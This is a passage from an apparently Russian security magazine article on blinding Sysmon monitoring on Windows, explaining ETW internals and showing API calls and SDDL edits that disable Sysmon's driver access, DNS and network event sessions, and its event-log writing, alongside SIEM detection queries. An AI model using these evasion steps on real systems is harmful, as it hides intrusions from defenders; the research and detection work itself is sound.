  о необходимос ти получить доступ в обход сущес твующего списка DACL
   (наличие данной опции требует у вызывающего процесса включен ных при-
   виле гий SE_BACKUP_NAME и SE_RESTORE_NAME).
 7. hTemplateFile — используется только при соз дании новых объектов.

Вот как будет выглядеть наш вызов CreateFile():


hDevice = CreateFile(
  lpDeviceName,
  READ_CONTROL | ACCESS_SYSTEM_SECURITY,
  0,
  NULL,
  OPEN_EXISTING,
  FILE_FLAG_BACKUP_SEMANTICS,
  NULL
);

Пос ле получения описателя для устройства \\.\SysmonDrv воспользуемся
функцией GetSecurityInfo(), которая поз волит вытащить информацию из дес-
крип тора безопасности:


DWORD GetSecurityInfo(
  [in]            HANDLE               handle,
  [in]            SE_OBJECT_TYPE       ObjectType,
  [in]            SECURITY_INFORMATION SecurityInfo,
  [out, optional] PSID                 *ppsidOwner,
  [out, optional] PSID                 *ppsidGroup,
  [out, optional] PACL                 *ppDacl,
  [out, optional] PACL                 *ppSacl,
  [out, optional] PSECURITY_DESCRIPTOR *ppSecurityDescriptor
);

Первый параметр (handle) при нимает описатель нашего объ екта, который
мы получили с помощью CreateFile().
  Далее нужно указать тип объекта (ObjectType), дескриптор безопасности
которого мы хотим посмотреть. Укажем SE_UNKNOWN_OBJECT_TYPE.
  В следующем аргументе (SecurityInfo) мы ука зываем, какие именно по-
ля дескрип тора безопасности мы хотим получить. В нашем случае это вот
такое объединение:


OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_
SECURITY_INFORMATION | SACL_SECURITY_INFORMATION

Оставшиеся параметры ука зывают на структуры данных, в которые будет
помеще на тре буемая нам информация.
  В итоге вызов GetSecurityInfo() имеет следующий вид:


GetSecurityInfo(
  hObject,
  SE_UNKNOWN_OBJECT_TYPE,
  OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION |
DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION,
  &pOwner,
  &pGroup,
  &pDacl,
  &pSacl,
  &pSecurityDescriptor
);

Пос мотрим  на  дес криптор  безопасности  для  \Device\SysmonDrv.
С помощью команд show owner <Device> и show group <Device> мож но
узнать хозяина объекта и группу, а командой show sd <Device> получить
пол ное содер жание SD в формате SDDL.





Security Descriptor выглядит следующим обра зом:


O:SYG:SYD:(A;;0x1201bf;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1200a9;;;
RC)S:AI

О том, как правильно читать такой формат, под робно написано в статье «Как
смот реть SDDL и не ломать глаза о точки с запяты ми» на «Хаб рахабре». Мы
остановимся лишь на одной его час ти — спис ке избирательного контроля
доступа (DACL). Он имеет такой вид:


D:(A;;0x1201bf;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1200a9;;;RC)

Cпи сок избирательного контро ля доступа (Discretionary Access Control List,
DACL) состоит из отдельных записей (Access Control Entries, ACE). Каждая
ACE оформляется в отдельных  круглых скобках. Именно DACL хранит
информацию о том, какому субъекту и какой именно доступ раз решен,
а какой зап рещен. Его мы раз берем подробнее.
  В глаза сразу бро сается запись (A;;FA;;;SY), которая говорит о том, что
учетной записи Local System (SY) воз можно пре доставлять (A) полный дос туп
(FA). Попробуем явно зап ретить любой дос туп для этой учетной записи.
Для это го символ A заменим D — (D;;FA;;;SY). Переписать  Security
Descriptor можно командой set sddldacl <DACL>. Она реализована через
вызов функции SetSecurityInfo(), которая принима ет параметры, аналогичные
GetSecurityInfo(), поэтому не будем раз бирать его под робно.





Проверим, что из это го выйдет, если поп росить сис тему закрыть хендл
на устройство с помощью уже известной нам техники — зак рытия хендла
через дуб ликат.





Видим, что ничего не изменилось и у про цесса Sysmon64.exe осталось
откры тое устройство \Device\SysmonDrv, но уже с дру гим опи сателем.
Веро ятно, мы чего-то не учли! Вернемся к дес крип тору безопасности.
  Обратим вни мание на первую запись в спис ке DACL — (A;;0x1201bf;;;
WD), которая означает, что для учет ной записи Everyone (WD) предоставлен
(A) какой-то довольно широкий дос туп — 0x1201bf (присутс твуют как минимум
FILE_READ_DATA и FILE_WRITE_DATA). Уберем ее из списка DACL и пов торим
операцию по закрытию хендла на устройство.





«Ура! Сработало!» — ска жет хакер и продол жит свои гряз ные делиш ки
в нашей системе.
   Ну а мы посмотрим в журнал Microsoft-Windows-Sysmon\Operational
и убе димся, что наш Sysmon, к сожалению, боль ше ничего не пишет.





Но не стоит отчаивать ся, мы как безопасники получи ли «плюс один» детект
для нашего SIEM:


Provider Name='Microsoft-Windows-Sysmon' and EventID='255' and Data
Name.Description='Failed to access the driver - Last
error: Неверный дескриптор'

С позиции же «спе цов по про никновению» здесь есть еще куда посмотреть,
но, пожалуй, мы про должим это увлекательное занятие в дру гой раз.
COVERSTORY





По лучив доступ к системе, зло умыш ленник
первым делом пытается вывести из строя
средства аудита, чтобы как можно дольше
оставать ся незамечен ным. В этой статье я
покажу,  как  атакующий может ослепить              driverenok                                                                                                       Threat Researcher
средства  мониторинга  Windows  путем        andreykras14@gmail.com
манипуляций с подсистемой Event Tracing
for Windows (ETW).




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.





Признаюсь честно, в прош лом материале, когда я сказал, что у атакующе го
получи лось ослепить Sysmon путем манипуляций с дес криптором безопас-
ности устройства \Device\SysmonDrv, я нем ножечко слукавил. На самом
деле после про делан ных манипуляций Sysmon перестанет формировать
лишь часть событий, но не все. Перестают генери роваться события, получен-
ные от драй вера SysmonDrv (это, кстати говоря, основная часть: события
запуска и завер шения процессов, загрузка DLL в адресное пространство
про цесса, заг рузка драй вера, манипуляций с клю чами реестра и дру гие).
Но есть еще один поставщик информа ции, на основе которого Sysmon фор-
мирует свои события, — это ETW. Сегод ня мы пос мотрим на этот механизм
со стороны атакующе го и попытаемся помани пулировать его работой, чтобы
«до конца ослепить Sysmon».


EVENT TRACING FOR WINDOWS

Event Tracing for Windows (ETW) — механизм опе рационной сис темы Windows,
предназначенный для регистрации событий, происходящих в сис теме.




                     Под робнее про тон кости работы ETW ты можешь
                      про честь на «Хабрахаб ре»:
                    •Самый худший из когда-либо созданных API
                        •Event  Tracing  for Windows  на  стороне  зла.
                      Но это не точно
                     •Изучаем  Event  Tracing  for  Windows:  теория
                       и прак тика


В ETW есть несколь ко основных понятий: провайдеры, сессии, контроллеры
и пот ребители.
 • Ïðî âàéäåðû (providers, пос тавщи ки событий) — это приложе ния (нап-
   ример, DLL), в которых реали зованы функции регис тра ции событий. Про-
   вайдер должен быть обязательно зарегистри рован в подсистеме ETW
   и иметь GUID. По сути, именно про вай дер отсле живает сос тояния при-
   ложений (или системы) и отправ ляет события в сес сию.
 • Ñåññèè  (sessions, сеанс трас сировки, лог гер) — сущности, которые
   собира ют события от провай деров и передают их потребителям. Одна
   сессия может потреблять события от одно го или нескольких про вайдеров.
  Сессии, как и провай деры, тоже имеют свой иден тификатор (GUID).
 • Êîí òðîë ëåðû  (controllers) —  это  приложе ния  (нап ример,  logman),
   которые управляют сессиями. Могут соз давать или уда лять сессии, а так-
  же изменять их параметры.
 • Ïîòðåáèòå ëè ñîáûòèé (consumers) — приложе ния, которые могут
   получать и как-то обрабатывать события от одной или нескольких сессий,
   а также из фай лов.

Можно сказать, что ETW осно ван на про вайдерах и потребителях. Провай-
деры формируют и передают события о сос тояниях, происхо дящих внутри
про цессов или ядра, а потребители используют эти события для собственных
целей (нап ример, для анализа производительнос ти). При чем между провай-
дером и потребителем при сутс твует промежу точная сущность — сеанс трас-
сировки (сессия).
  Дело в том, что один про вайдер может генерировать множес тво предоп-
ределен ных типов событий, часть из которых нужна одним потребителям,
а другая часть — другим. Именно на уровне сессии происходит фильтрация
событий. Кроме  того, одной груп пе пот ребителей могут потребоваться
события не от одного, а сра зу от груп пы провай деров, поэтому сеанс трас-
сировки может собирать события сразу от несколь ких провай деров и отда-
вать их нескольким пот ребителям.
  Давай пос мотрим, как это выг лядит в ядре ОС. За общее состояние под-
системы ETW отвечает структура _ETW_SILODRIVERSTATE, адрес которой
можно получить из глобальных переменных ядра.




В этой  структуре  есть два интерес ных нам  поля: EtwpLoggerContext
и EtwpGuidHashTable.





Остановимся на них под робнее.


Ñåññèè ETW
По ле  EtwpLoggerContext —  указатель  на  мас сив  струк тур  типа
_WMI_LOGGER_CONTEXT, каж дая из которых опи сывает сес сию сбора
событий. Адре са для этих структур можно получить способом, изображенным
ниже.





Об рати внимание, что первые адреса равны 0x00000000 00000001. Скорее
все го, это связано с тем, что два сеанса трас сировки пре допределены сис-
темой и не могут быть изменены, поэто му они имеют такие значения.
  Давай пос мотрим на определение структуры _WMI_LOGGER_CONTEXT.





На скри не выведе ны только наиболее интерес ные нам детали:
 • Поле LoggerId — идентифика тор сеанса трассировки.
 • Параметр   LoggerName   содержит   имя   сес сии   в   формате
  _UNICODE_STRING.
 • InstanceGuid — идентификатор сессии трассировки в формате GUID.
 • Параметр SecurityDescriptor — указатель на дескриптор безопас-
   ности сессии.
 • Поле    Consumers    представ ляет    собой    список    струк тур
  _ETW_REALTIME_CONSUMER, каждая из которых содержит  указатель
   на структуру _EPROCESS. Сама структура _ETW_REALTIME_CONSUMER
   опи сывает отдельный объект — потребитель событий.





По ле ProcessObject — это указатель на структуру _EPROCESS процесса-пот-
ребителя.
  Для примера давай посмотрим на сессию 0xFFFFBA05E862D040.





Тут  мы  видим,  что  у  сес сии  EventLog-Microsoft-Windows-Sysmon-
Operational есть толь ко один потребитель и это процесс с идентифика-
тором 1528. Инте ресно, что же это за про цесс?





Да, это служ ба журнала событий Windows, которая берет события Sysmon-
про вай дера и записывает их в файл .evtx. Но об этом чуть позже. А пока давай
вернемся к структурам ядра.


ETW-ïðîâàéäåðû
Навер ное, было бы логич но, если бы в _WMI_LOGGER_CONTEXT был указатель
на массив провайдеров, которые пишут события в сессию. Но нет, все устро-
ено немного иначе.
  Каждый зарегистри рованный в системе провай дер описывается струк-
турой _ETW_GUID_ENTRY.





При чем пос тавщик событий может пре доставлять события не более чем
в восемь сеансов трассировки. Эти сведения хранятся в поле EnableInfo,
которое представляет собой мас сив структур типа _TRACE_ENABLE_INFO.
Эта структура содержит информацию о «сос тоянии провай дера внутри сес-
сии» (вклю чен/вык лючен — поле IsEnable), о «при надлежности» к конкрет-
ной  сессии  (поле  LoggerId),  а  также  поля  фильтра ции  событий
(MatchAnyKeyword и MatchAllKeyword).





Парамет ры про вайдера, описанные в структуре _TRACE_ENABLE_INFO, можно
нас троить  одновре менно  для  всех  сессий.  Для  этого  в  структуре
_ETW_GUID_ENTRY есть отдельное поле ProviderEnableInfo.
   Как ты можешь заметить, у каждого провай дера есть свой дес криптор
безопасности  —   это   поле   SecurityDescriptor   в   структуре
_ETW_GUID_ENTRY.
  Обрати внимание, что пер вый элемент структуры — GuidList. Это двус-
вязный спи сок, в виде которого хранятся все про вай деры. Чтобы зарегис три-
ровать в системе новый провайдер, ядру нужно пройтись по всем элементам
этого списка и в конец добавить ссылку на новую структуру. А чтобы выпол-
нить какую-либо опе рацию над зарегистри рован ным провай дером (добавить
про вай дер в сессию, вклю чить/вык лючить, изменить дескриптор безопас-
ности), ядру придется пройти по каждому элементу, пока он не найдет нуж-
ного ему пос тавщика. Такой под ход негативно сказывается на про изво-
дительнос ти.
  Давай вернемся к основной структуре, описывающей сос тояние ETW
(структура  _ETW_SILODRIVERSTATE),  и  обра тим  внимание  на  поле
EtwpGuidHashTable, оно имеет тип _ETW_HASH_BUCKET. Это поле пред-
став ляет собой массив из 64 типов (64 элемен тов) списков про вайдеров.
  Дело в том, что с эволюци ей Windows существенно увеличилось количес-
тво поставщиков событий, и с точки зрения про изводительности было бы
не очень разум но хранить это множес тво зарегис трированных в системе про-
вай деров в виде одно го спис ка. Поэто му разработчики решили разделить
все про вайдеры на группы. Признаком принадлежности провайдера к опре-
деленной группе служит взя тый от GUID хеш, который вычисляется вот
по такой фор муле:


Guid->Data1 XOR (Guid->Data2 XOR Guid->Data4[0] XOR Guid->Data4[4]))
& 0x3F

Значение 0x3F ограничи вает размер хеша шестью битами (64 уникальных
зна чения). Отсю да и берет ся размер массива EtwpGuidHashTable рав-
ный 64 эле ментам.
  Помимо того что про вайдеры делятся на груп пы в зависимос ти от хеша,
они еще бывают нес кольких типов. Типы про вай деров определены перечис-
лени ем _ETW_GUID_TYPE. Так, ListHead[0] содер жит спи сок провайдеров
типа    EtwTraceGuidType,    а    ListHead[1]  —    список    типа
EtwNotificationGuidType. Этот факт усложня ет представление списков
про вай деров в ядре Windows.




Итак, в системе существует 64 ãðóïïû ñïèñêîâ ïðî âàéäåðîâ, опре-
деленных массивом EtwpGuidHashTable. Каждая группа име ет три раз личных
списка, в зависи мости от типа. Сначала это не так просто осознать, но не
вол нуйся, со временем все обязательно уло жится в голове.
  Предлагаю поуп ражняться и най ти хеш для про вай дера {5770385F-C22A-
43E0-BF4C-06F5698FFBD9}. Забегая впе ред, скажу,  что это провай дер,
зарегистрирован ный  про цессом  Sysmon64.exe —  Microsoft-Windows-
Sysmon.


(0x5770385F XOR 0xC22A XOR 0xBF XOR 0x69) & 0x3F = 0x23

0x23 — 35 в десятичной системе счисления. Это означает, что наш провай-
дер  хра нится  в  35-м  наборе  спис ков  (в  35-м  элементе  массива
EtwpGuidHashTable). Давай проверим это:
 1. Получим 35-й элемент массива EtwpGuidHashTable:


   dx -r0 @$GuidTable = ((nt!_ESERVERSILO_GLOBALS*)&nt!
   PspHostSiloGlobals)->EtwSiloState->EtwpGuidHashTable[35]

 2. Из него возьмем нулевой элемент списка ListHead и выведем содержимое
   это го списка:


   dx -g Debugger.Utility.Collections.FromListEntry(@$GuidTable.
   ListHead[0], "nt!_ETW_GUID_ENTRY", "GuidList").Select(entry => new
   {GUID = entry.Guid, SecurityDescriptor = entry.SecurityDescriptor}
   )

 3. Убеждаемся, что в 35-м наборе списков присутству ет GUID Sysmon-про-
   вайдера.





NT Kernel Logger Session
По мимо того что сеансы трас сировки могут соз даваться отдельными при-
ложениями, в системе существует специальный тип сессии — NT Kernel
Logger, который предназначен для наблюдения за предопределенными клас-
сами событий ядра ОС (события подсистемы вво да-вывода, менеджера
управле ния памятью, менеджера кон фигурации и сте ка TCP/IP и дру гих).
Для нужд этой сессии в системе существует и специальный провай дер
SystemTraceProvider (а начиная с Windows 10 — нес колько провай деров),
который отве чает за формирование этих самых событий.
   Чтобы вклю чить в сессию системный про вай дер, в поле LogFileMode
структуры   EVENT_TRACE_PROPERTIES   нужно   помес тить   значение
EVENT_TRACE_SYSTEM_LOGGER_MODE (0x02000000). В соответс твии с ру-
ководс твом Microsoft, что бы определить перечень событий, за которыми мы
хотим наблюдать, нам нужно указать «спи сок» фла гов в поле EnableFlags
структуры EVENT_TRACE_PROPERTIES.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





       МАНИПУЛИРУЕМ ОБЪЕКТАМИ ETW,
          ЧТОБЫ ОБОЙТИ МОНИТОРИНГ





SYSMON && ETW

В приведенном выше описании мы немного освежили знания, которые нам
помогут при исследовании процес сов работы инструмента Sysmon. Пора
приступать к самому исследова нию.
   Итак, чтобы получить хоть какие-то доказательства того, что Sysmon и ETW
име ют отно шение друг к дру гу, посмотрим на список хендлов процесса
Sysmon64.exe.





О том, как работают команды search  name  <ProcessPattern> и show
handles <PID> <Type>, я рассказывал в прошлом матери але.
   Как видим, в таб лице хендлов присутс твуют описатели для двух объектов
ядра типа EtwConsumer. Этот объект пред став ляет собой подключенный ETW-
пот ребитель, способный получать события от сеан сов трассиров ки.
  Вы вод выше означает, что процесс Sysmon64.exe потребля ет события
от двух сессий. Проверим это. Посмотрим на список всех сеансов трас-
сировки, зарегистри рованных в системе, и найдем наиболее под ходящие
по смыслу для Sysmon.





Ко ман да  search   session   <SessionPattern>  вызывает  функцию
QueryAllTracesW:


ULONG WMIAPI QueryAllTracesW(
  [out] PEVENT_TRACE_PROPERTIES *PropertyArray,
  [in]  ULONG                    PropertyArrayCount,
  [out] PULONG                   LoggerCount
);

Пос ледние два параметра (PropertyArrayCount и LoggerCount) указывают
на име ющееся и тре буемое количес тво элементов массива PropertyArray.
  На пер вом параметре (PropertyArray) давай оста новимся немного под-
робнее. Это óêàçàòåëü íà ìàññèâ óêàçàòå ëåé íà ñòðóê òóðû типа
EVENT_TRACE_PROPERTIES, каждая из которых описывает параметры сес-
сии. Вни мательный читатель задастся вопросом, почему же нельзя было
передавать  в  функцию  просто  óêàçàòåëü  íà  ìàññèâ  ñòðóê òóð
EVENT_TRACE_PROPERTIES. Это, скорее все го, свя зано с тем, что структура,
описывающая сессию, не име ет постоян ного размера.
  Дело в том, что в самой структуре отсутству ют поля «имя лог-файла»
и «имя сессии», размер каждого из которых не должен пре вышать 1024 сим-
вола. Эти поля записываются в память çà ñòðóê òóðîé, а в самой струк туре
указываются     просто    смещения     (поля     LogFileNameOffset
и LoggerNameOffset) отно сительно ее начала. Наверное, с целью экономии
памяти разработ чики решили сделать размер этой структуры переменной
длины.
   Чтобы получить список сессий, нужно сде лать как минимум два вызова
функции QueryAllTracesW. Первый вернет количество сессий. На осно ве
этой информации нуж но будет:
 1. Выделить память для массива указателей с количес твом элементов, рав-
  ным количеству сес сий.
 2. Выделить буфер ную память, в которую будет сох ранена информация
  обо всех сессиях.
 3. Разделить буферную память на кус ки, в каждый из которых будет помеще-
   на информация об отдельной сессии, а адресами каждого из кусков ини-
   циали зиро вать массив указателей, объявленный на первом шаге.
 4. Для    каждого   буферного    кус ка    (для    каждой    структуры
  EVENT_TRACE_PROPERTIES) установить зна чения полей BufferSize,
  LoggerNameOffset и LogFileNameOffset.

Сно ва вызвать функцию QueryAllTracesW и получить спи сок сессий (при
условии, что раз мера выделенного буфера хва тит для сохранения этой
информации).
   Итак, про деланные манипуляции поз волили нам получить три сеанса,
по названию схо жие с Sysmon. Как мы выяснили ранее, сес сия EventLog-
Microsoft-Windows-Sysmon-Operational создана для того, чтобы служба
журнала событий Windows мог ла потреблять события от Sysmon и писать их
в соответствующий журнальный файл. Эту сес сию давай оставим напоследок,
а сей час остановим ся на сеансах SysmonDnsEtwSession и SYSMON TRACE.
  Но для начала убедимся, что их потребитель — это именно процесс
Sysmon64.exe. Мне неизвестен спо соб, как это можно сделать из режима
поль зовате ля, поэтому обратимся к нашему любимому отладчику.
  В WinDbg  есть рас ширение !wmitrace,  которое позволя ет удобно
работать со струк турами ETW. С помощью команды !wmitrace.strdump
получим спи сок сеансов ETW.





Ко ман дой !wmitrace.logger <LoggerId> получим под робную информацию
о сес сии SYSMON TRACE.





По ле Consumer содержит сос тоящий из одно го элемента спи сок адресов
структур _ETW_REALTIME_CONSUMER, каж дая из которых содержит указатель
на _EPROCESS.





Таким образом мы убеждаемся, что потребителем сессии SYSMON  TRACE
является процесс Sysmon64.exe.
  Для сеанса SysmonDnsEtwSession пот ребитель тоже Sysmon64.exe. Про-
верить это ты можешь самостоятельно, проделав перечень шагов, аналогич-
ный опи сан ному выше.


ÌÀÍÈÏÓËÈÐÓÅÌ Ñ ETW È ËÎÌÀÅÌ SYSMON

Мы убедились, что Sysmon для своего фун кци онирования создает нес колько
сеан сов трассировки. Давай теперь пос мотрим, какие именно манипуляции
могут совершать ата кующие при попыт ке ослепить Sysmon.


Âûêëþ÷àåì ïðîâàéäåðû ñåññèè SysmonDnsEtwSession
Раз уж сессии собирают события от провай деров, а у каждого провайдера
в струк туре _ETW_GUID_ENTRY есть массив его сос тояний, пер вое, что при-
ходит в голову (с позиции атакующего), — это отклю чить провайдер от сес-
сии. Так и поступим.
  Давай  посмотрим  на  спи сок  провайдеров,  от  которых  сессия
SysmonDnsEtwSession получает события.





Ко ман да show session <SessionHandle> вызывает функцию ControlTraceW
с параметром EVENT_TRACE_CONTROL_QUERY.


ULONG WMIAPI ControlTraceW(
  [in]      TRACEHANDLE             TraceHandle,
  [in]      LPCWSTR                 InstanceName,
  [in, out] PEVENT_TRACE_PROPERTIES Properties,
  [in]      ULONG                   ControlCode
);

Пройдемся по параметрам.
 • TraceHandle при нимает идентификатор (дес криптор сес сии).
 • Вто рой параметр (InstanceName) — имя сессии. Один из первых двух
   параметров может быть равен NULL.
 • Сле дующий   параметр   воз вращает   структуру   описания   сессии
  EVENT_TRACE_PROPERTIES.
 • В параметре ControlCode указывается код опе рации. В нашем случае он
   равен EVENT_TRACE_CONTROL_QUERY.

Вызов этой фун кции поз воляет получить информацию об име ни сес сии, ее
GUID, а так же парамет ры LogFileMode и EnableFlags, но не предоставляет
информации о про вайдерах.
  Далее нам нужно получить информацию о провайдерах, которые предос-
тавляют события в сессию. Я не знаю спо соба, как запросто получить список
про вай деров для конкретной сессии. Судя по тому, как это делает оснастка
perfmon.exe, логика тут следующая: нужно получить полный спи сок про вай-
деров, зарегистри рованных в сис теме, прой тись по каждому и найти приз-
наки его при надлежности к сессии ETW. В целом логика повторяет структуру
представ ления провай деров в ядре Windows.
  Получить   спи сок   провайдеров   можно   с   помощью   вызова
TdhEnumerateProviders:


TDHSTATUS TdhEnumerateProviders(
  [out]     PPROVIDER_ENUMERATION_INFO  pBuffer,
  [in, out] ULONG                      *pBufferSize
);

Эта     функция      возвра щает      структуру      данных      типа
PROVIDER_ENUMERATION_INFO, которая содержит информацию о количес-
тве    зарегистри рованных    в    сис теме   провайдеров    (параметр
NumberOfProviders), и массив типа TRACE_PROVIDER_INFO, который опи-
сывает каждый провай дер в отдельности с указанием имени (вычисляется
с помощью ProviderNameOffset) и GUID (поле ProviderGuid). Таким обра-
зом, вызов функции TdhEnumerateProviders вер нет нам информацию
об име нах и GUID провай деров, но не даст информации о принадлежности
про вай деров к конкретной сессии.
   Чтобы получить недостающую информа цию, мы для каждого про вайдера
должны вызвать функцию EnumerateTraceGuidsEx:


ULONG WMIAPI EnumerateTraceGuidsEx(
  [in]  TRACE_QUERY_INFO_CLASS TraceQueryInfoClass,
  [in]  PVOID                  InBuffer,
  [in]  ULONG                  InBufferSize,
  [out] PVOID                  OutBuffer,
  [in]  ULONG                  OutBufferSize,
  [out] PULONG                 ReturnLength
);

Разберем параметры.
 • TraceQueryInfoClass принимает тип зап роса функции. В нашем случае
   он равен TraceGuidQueryInfo, это означает, что нам нужно получить
  информацию о провай дере.
 • GUID провайдера передается в виде буфера InBuffer.
 • Параметр InBufferSize определяет размер буфера.
 • Четвертым параметром  (OutBuffer) передается указатель на возвра-
  щаемый буфер.
 • Пятый (OutBufferSize) и шестой (ReturnLength) параметры указывают
   размер имеющейся и требуемой памяти, в которую помещается результат
   работы фун кции.

Параметр OutBuffer представ ляет собой структуру дан ных, заголовком
которой является TRACE_GUID_INFO.
   Вслед  за  заголовком  идет  одна  или  нес колько  струк тур  типа
TRACE_PROVIDER_INSTANCE_INFO, каж дая из которых описывает принад-
лежность сессии к провайдеру и парамет ры фильтрации событий. Наглядно
это мож но предста вить в следующем виде.





Видим, что в сессию включен один провайдер — Microsoft-Windows-DNS-
Client. Отклю чим его от сес сии SysmonDnsEtwSession. Это можно сделать
с    помощью     функции      EnableTraceEx2     с     параметром
EVENT_CONTROL_CODE_DISABLE_PROVIDER:


ULONG WMIAPI EnableTraceEx2(
  [in]           TRACEHANDLE              TraceHandle,
  [in]           LPCGUID                  ProviderId,
  [in]           ULONG                    ControlCode,
  [in]           UCHAR                    Level,
  [in]           ULONGLONG                MatchAnyKeyword,
  [in]           ULONGLONG                MatchAllKeyword,
  [in]           ULONG                    Timeout,
  [in, optional] PENABLE_TRACE_PARAMETERS EnableParameters
);

 • Первый параметр  (TraceHandle) — дес криптор сес сии трассировки.
  В нашем случае этот параметр равен 0x23.
 • В сле дующем параметре  (ProviderId) передается GUID провай дера.
  Для  провай дера  Microsoft-Windows-DNS-Client  он  равен  {
  1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}.
 • Параметр     ControlCode     принимает      тип     операции
    (EVENT_CONTROL_CODE_DISABLE_PROVIDER).
 • Четвертый параметр  (Level) — уро вень логирования. Установим его
   в TRACE_LEVEL_INFORMATION.
 • Пятый и шестой параметры  (MatchAnyKeyword и MatchAllKeyword)
   принимают параметры фильтрации событий.  Установим  их равными
  0xFFFFFFFFFFFFFFFF и 0x00 соот ветственно.
 • Последние параметры (Timeout и EnableParameters) установим рав-
  ными нулю.

Ко ман да disable <ProviderGuid> <SessionHandle> работает на основе
функции EnableTraceEx2.





Открываем оснастку «Просмотр событий», пытаемся отрезол вить нас коль ко
DNS-имен и убеждаемся в отсутствии событий «EventID 22 (DNS query)»
в журнале Microsoft-Windows-Sysmon\Operational.
   Итак, нашему атакующему удалось скрыть события разрешения имен
от Sysmon, но остался еще один тип событий — «EventID 3 (Network
connection detection)».


Èçìåíÿåì ôëàãè ñåññèè SYSMON TRACE
Те перь давай пос мотрим, какие провайдеры отправляют события в сеанс
SYSMON TRACE.





Как видим, спи сок провай деров пуст, однако тут стоит обратить внимание
на значение параметра LogFileMode и вспом нить про специальный тип сес-
сий — NT Kernel Logger. Видим, что в списке парамет ров присутствует
EVENT_TRACE_SYSTEM_LOGGER_MODE (0x02000000). Это значит, что провай-
дером для нее является SystemTraceProvider, а перечень типов событий
определяется параметром EnableFlags (0x10000).
  Представим, что нашему атакующему приш ло в голову отключить все типы
событий системного провай дера. Это можно сделать с помощью вызова фун-
кции ControlTraceW с параметром EVENT_TRACE_CONTROL_UPDATE. А в саму
функцию  передать  структуру  EVENT_TRACE_PROPERTIES  с  параметром
EnableFlags, рав ным 0x00. Команда set enableflags <SessionHandle> <
Flags> выполняет эти операции.





Повторно открываем оснастку «Просмотр событий», пытаемся уста новить
соединение с каким-нибудь сер вером и убеждаемся в отсутс твии не только
событий  «EventID 22 (DNS  query)», но и событий  «EventID 3 (Network
connection detection)» в журнале Microsoft-Windows-Sysmon\Operational.


Ìàíèïóëèðóåì äåñêðèïòîðàìè áåçîïàñíîñòè ñåññèè EventLog-
Microsoft-Windows-Sysmon-Operational
В ито ге всю информа цию, получаемую от модуля ядра SysmonDrv (под-
робнее — в прошлой статье) и от подсистемы ETW, служба режима поль-
зователя Sysmon агрегиру ет  внутри себя и пишет  в журнал событий
Microsoft-Windows-Sysmon\Operational.
  В этом механизме также задей ство ваны сессии ETW и провай деры. Ранее
мы с тобой видели, что в системе присутс тву ют три сессии, созвучные
с Sysmon, и первая из  них — EventLog-Microsoft-Windows-Sysmon-
Operational, которую мы договаривались оставить на конец. Так вот, конец
нас тал!
  Давай пос мотрим на список провайдеров этой сес сии.





Видим, что у сессии есть один провай дер — Microsoft-Windows-Sysmon.
  Ранее, когда мы смотрели струк туры ядра, опи сывающие объекты сессии
и про вайдера, видели, что у каждой из них есть поле SecurityDescriptor.
Предлагаю попробовать поманипулировать им.
  Давай сна чала попробуем изменить SecurityDescriptor для провай дера
Microsoft-Windows-Sysmon, а потом для сес сии EventLog-Microsoft-
Windows-Sysmon-Operational и пос мотрим, что из этого вый дет.




                    Перед началом это го эксперимента необходимо
                       вернуть всё на исходную позицию и убедиться,
                         что Sysmon пишет события в свой журнал.


Пос мотрим на дескриптор безопас ности провай дера. Это мож но сде лать,
используя вызов EventAccessQuery:


ULONG EVNTAPI EventAccessQuery(
  [in]      LPGUID               Guid,
  [in, out] PSECURITY_DESCRIPTOR Buffer,
  [in, out] PULONG               BufferSize
);

 • Первым параметром (Guid) передается GUID сессии или про вайдера.
 • Вто рым парамет ром (Buffer) передается адрес буфера, в который будет
  помещен дескрип тор безопасности сессии или провайдера.
 • И наконец, пос ледний параметр (BufferSize) получает и возвращает
   размер буфера.





Дескрип тор безопасности имеет следующий вид:


O:BAG:BAD:(A;;0x1800;;;WD)(A;;0x120fff;;;SY)(A;;0x120fff;;;LS)(A;;
0x120fff;;;NS)(A;;0x120fff;;;BA)(A;;0xee5;;;LU)(A;;LC;;;MU)(A;;
0x1800;;;AC)(A;;0x1800;;;S-1-15-3-1024-3153509613-960666767-
3724611135-2725662640-12138253-543910227-1950414635-4190290187)

Первая запись в списке DACL (A;;0x1800;;;WD) означает, что для учетной
записи Everyone нужно пре доставить следующий доступ:


TRACELOG_ACCESS_KERNEL_LOGGER | TRACELOG_REGISTER_GUIDS

Вторая запись ((A;;0x120fff;;;SY)) предоставляет полный дос туп для учет-
ной записи Local System.
  Давай  явно  запретим  для  Local  System  доступ  к  провайдеру —
(D;;0x120ﬀf;;;SY), а ACE для учетки Everyone вообще убе рем. Это можно сде-
лать с помощью функции EventAccessControl:


ULONG EVNTAPI EventAccessControl(
  [in] LPGUID  Guid,
  [in] ULONG   Operation,
  [in] PSID    Sid,
  [in] ULONG   Rights,
  [in] BOOLEAN AllowOrDeny
);

 • Первым параметром  (Guid) передается идентификатор провай дера
   или сеан са, для которого нужно изме нить дес крип тор безопас ности.
 • Вто рым (Operation) указывается тип операции. Это может быть добав-
   ление записи в списки DACL/SACL или полная замена этих списков.
 • Третьим параметром (Sid) передается иден тификатор учетной записи,
   для которой изменяются права доступа.
 • Сле дующим параметром  (Rights) передается перечень прав дос тупа
   в виде маски.
 • И последним параметром (AllowOrDeny) определяется тип операции:
   разрешить или запретить.

Ко ман да set sddldacl <Guid> <sddldacl> реали зует вызов этой функции.




Пе резагружаем машину и убеждаем ся, что в журнале Sysmon нет событий.
При чем пос ледним событи ем является EventID 255. Эта техника, в отличие
от пре дыдущих, будет персистен тной.





По лучаем еще один детект для нашего SIEM:


Provider Name='Microsoft-Windows-Sysmon' and EventID='255' and Data
Name.Description='Failed to open service configuration with error 94
- Last error: Носитель защищен от записи.'

Вернем  всё  назад и попробуем проделать аналогичные манипу ляции
